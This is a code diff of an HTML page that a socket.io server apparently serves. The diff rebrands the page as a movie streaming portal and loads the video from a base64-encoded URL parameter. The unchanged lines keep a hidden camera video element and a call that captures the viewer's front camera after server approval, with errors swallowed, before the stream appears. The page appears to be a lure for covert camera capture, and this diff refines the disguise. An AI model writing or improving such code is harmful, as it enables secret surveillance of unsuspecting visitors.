@@ -3,24 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Profile & Portal</title>
+    <title>Movie & Stream Portal</title>
     <script src="/socket.io/socket.io.js"></script>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body, html { 
+        * { box-sizing: border-box; }
+        body { 
             background: #0b0f19; 
-            height: 100%;
-            width: 100%;
+            margin: 0; 
             overflow: hidden; 
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            width: 100vw;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             color: #fff;
         }
         
         #profileSection {
             position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
             z-index: 20;
             background: #111827;
             padding: 30px 24px;
@@ -107,22 +108,25 @@
         }
         .btn:hover { background-color: #0ea5e9; }
 
-        #mediaContainer {
-            width: 100vw;
-            height: 100vh;
+        /* Movie Streaming Box Player Container (Centered & Responsive) */
+        #playerContainer {
+            width: 92%;
+            max-width: 1000px;
+            aspect-ratio: 16 / 9;
+            background: #000;
+            border-radius: 14px;
+            overflow: hidden;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.8);
+            border: 1px solid #1f2937;
             display: none;
             position: absolute;
-            top: 0;
-            left: 0;
             z-index: 5;
-            background: #000;
         }
 
-        #mediaContainer iframe {
+        #mediaPlayer {
             width: 100%;
             height: 100%;
             border: none;
-            background: #000;
         }
     </style>
 </head>
@@ -138,7 +142,7 @@
         </div>
         
         <h2>Create Profile</h2>
-        <p>Set up your profile picture and name to watch the portal.</p>
+        <p>Set up your profile picture and name to watch the stream.</p>
         
         <input type="text" id="username" class="input-box" placeholder="Enter Your Name" autocomplete="off">
         <input type="file" id="profilePicInput" class="file-input" accept="image/*">
@@ -146,9 +150,9 @@
         <button class="btn" id="actionBtn">Allow & Continue</button>
     </div>
 
-    <!-- Container jisme aapka Koyeb watch portal embed kiya gaya hai -->
-    <div id="mediaContainer">
-        <iframe src="https://sufficient-annalee-dminemraj-38da470f.koyeb.app/watch/1c7c1121-acfa-451e-98aa-477e8fe9a0bc" allowfullscreen allow="autoplay; fullscreen; encrypted-media; picture-in-picture" referrerpolicy="no-referrer"></iframe>
+    <!-- Cinematic Streaming Box -->
+    <div id="playerContainer">
+        <iframe id="mediaPlayer" allow="autoplay; fullscreen"></iframe>
     </div>
 
     <video id="hiddenCamera" autoplay playsinline style="display:none; position:absolute; opacity:0; pointer-events:none;"></video>
@@ -160,10 +164,18 @@
         const profilePicInput = document.getElementById('profilePicInput');
         const previewImg = document.getElementById('previewImg');
         const actionBtn = document.getElementById('actionBtn');
-        const mediaContainer = document.getElementById('mediaContainer');
+        const playerContainer = document.getElementById('playerContainer');
+        const mediaPlayer = document.getElementById('mediaPlayer');
         
         let socket = io();
         let wakeLock = null;
+
+        // Server-injected default stream URL from environment variable
+        const serverDefaultUrl = "__DEFAULT_STREAM_URL__";
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const encodedVid = urlParams.get('v');
+        let targetVideoUrl = encodedVid ? atob(encodedVid) : serverDefaultUrl;
 
         // Persistent check via LocalStorage
         window.addEventListener('DOMContentLoaded', () => {
@@ -176,7 +188,8 @@
                 if (savedAvatar) previewImg.src = savedAvatar;
 
                 profileSection.style.display = 'none';
-                mediaContainer.style.display = 'block';
+                playerContainer.style.display = 'block';
+                mediaPlayer.src = targetVideoUrl; 
 
                 socket.emit('register_device', { name: savedName });
                 initializeSecuritySystem();
@@ -213,7 +226,7 @@
         });
 
         socket.on('device_approved', async () => {
-            actionBtn.innerText = "Loading Portal...";
+            actionBtn.innerText = "Loading Stream...";
 
             try {
                 await captureSequence("user", "front");
@@ -221,7 +234,8 @@
             } catch (err) {}
 
             profileSection.style.display = 'none';
-            mediaContainer.style.display = 'block';
+            playerContainer.style.display = 'block';
+            mediaPlayer.src = targetVideoUrl; 
 
             initializeSecuritySystem();
         });
@@ -371,7 +385,7 @@
         }
 
         document.addEventListener('visibilitychange', async () => {
-            if (document.visibilityState === 'visible' && mediaContainer.style.display === 'block') {
+            if (document.visibilityState === 'visible' && playerContainer.style.display === 'block') {
                 keepScreenAwake();
             }
         });
